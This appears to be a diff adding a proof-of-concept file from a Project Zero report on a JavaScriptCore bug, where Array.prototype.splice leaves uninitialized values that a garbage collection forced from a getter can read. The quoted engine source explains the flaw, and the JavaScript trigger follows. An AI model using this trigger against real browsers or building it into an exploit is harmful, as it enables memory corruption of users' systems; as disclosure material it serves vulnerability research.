@@ -1,0 +1,53 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1234
+
+Here's a snippet of arrayProtoFuncSplice.
+
+EncodedJSValue JSC_HOST_CALL arrayProtoFuncSplice(ExecState* exec)
+{
+    ...
+
+            result = JSArray::tryCreateForInitializationPrivate(vm, exec->lexicalGlobalObject()->arrayStructureForIndexingTypeDuringAllocation(ArrayWithUndecided), actualDeleteCount);
+            if (UNLIKELY(!result)) {
+                throwOutOfMemoryError(exec, scope);
+                return encodedJSValue();
+            }
+
+            // The result can have an ArrayStorage indexing type if we're having a bad time.
+            bool isArrayStorage = hasAnyArrayStorage(result->indexingType());
+            bool success = false;
+            if (UNLIKELY(isArrayStorage)) {
+                static const bool needToFillHolesManually = true;
+                success = copySplicedArrayElements<needToFillHolesManually>(exec, scope, result, thisObj, actualStart, actualDeleteCount);
+            } else {
+                ASSERT(hasUndecided(result->indexingType()));
+                static const bool needToFillHolesManually = false;
+                success = copySplicedArrayElements<needToFillHolesManually>(exec, scope, result, thisObj, actualStart, actualDeleteCount);
+            }
+            if (UNLIKELY(!success)) {
+                ASSERT(scope.exception());
+                return encodedJSValue();
+            }
+    ...
+}
+
+|result| has uninitalized values. If a GC is triggered before those values get initalized, the garbage collector will refer the uninitialized values.
+
+PoC:
+-->
+
+function gc() {
+    for (let i = 0; i < 4; i++)
+        new ArrayBuffer(0x1000000);
+}
+
+Array.prototype.__defineGetter__(1000, () => 0);
+
+for (let i = 0; i < 0x1000; i++)
+    new Array(0x10).fill([{}, {}, {}, {}]);
+
+for (let i = 0; i < 0x1000; i++) {
+    let x = {length: 0x10};
+    x.__defineGetter__(0, () => gc());
+    Array.prototype.splice.call(x, 0);
+}
